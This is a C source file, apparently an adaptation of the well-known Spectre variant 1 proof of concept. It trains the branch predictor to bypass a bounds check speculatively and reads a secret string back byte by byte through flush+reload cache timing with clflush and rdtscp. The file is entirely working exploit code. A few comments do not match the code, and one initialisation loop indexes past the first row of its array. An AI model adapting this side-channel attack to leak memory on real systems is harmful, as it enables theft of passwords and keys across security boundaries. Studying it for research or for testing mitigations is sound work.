#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

uint8_t array[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t mem_pages[256][4096];

void victim_function(size_t index)
{
    _mm_clflush(array);
    for (volatile int z = 0; z < 100; z++);
    
    uint8_t temp = 0;
    if (index < sizeof(array))
    {
        temp = mem_pages[array[index]][0];
    }
}

void speculative_execution(uint8_t* target, int tries)
{
    register int offset_to_array = (target - array);
    register size_t training_x, index;
    training_x = tries % sizeof(array);
    for (int i = 0; i < 30; i++)
    {
        index = ((i % (sizeof(array)/2)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        index = (index | (index >> sizeof(array))); /* Set x=-1 if j&6=0, else x=0 */
        index = training_x ^ (index & (offset_to_array ^ training_x));
        victim_function(index);
    }
}

uint8_t get_best_result(int results[256])
{
    uint8_t ret = '?';
    int max = 0;
    for (int i = 0; i < 256; i++)
    {
        if (results[i] > max)
        {   
            max = results[i];
            ret = i;
        }
    }

    return ret;
}

void detect_cached_page(int results[256])
{
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    int junk;
    for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255;
        volatile uint8_t* addr = mem_pages[mix_i];
        register uint64_t time1 = __rdtscp(&junk); /* READ TIMER */
        junk = *addr; /* MEMORY ACCESS TO TIME */
        register uint64_t time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        if (time2 <= CACHE_HIT_THRESHOLD)
            results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
}

uint8_t probe(char* secret)
{
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    
    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 0; tries < 999; tries++)
    {
        for (i = 0; i < 256; i++)
        {
            _mm_clflush(mem_pages[i]);
        }

        speculative_execution(secret, tries);

        detect_cached_page(results);
    }

    return get_best_result(results);
}

char *secret = "Hello, Abu coding!";

int main(int argc, const char **argv) {
    int i, score[2], len=18;
    uint8_t value[2];

    for (i = 0; i < sizeof(mem_pages); i++)
        mem_pages[0][i] = 1; /* write to mem_pages so in RAM not copy-on-write zero pages */
    
    while (--len >= 0) 
    {
        uint8_t ret = probe(secret++);
        printf("Result: %c", ret);
        printf("\n");
    }
}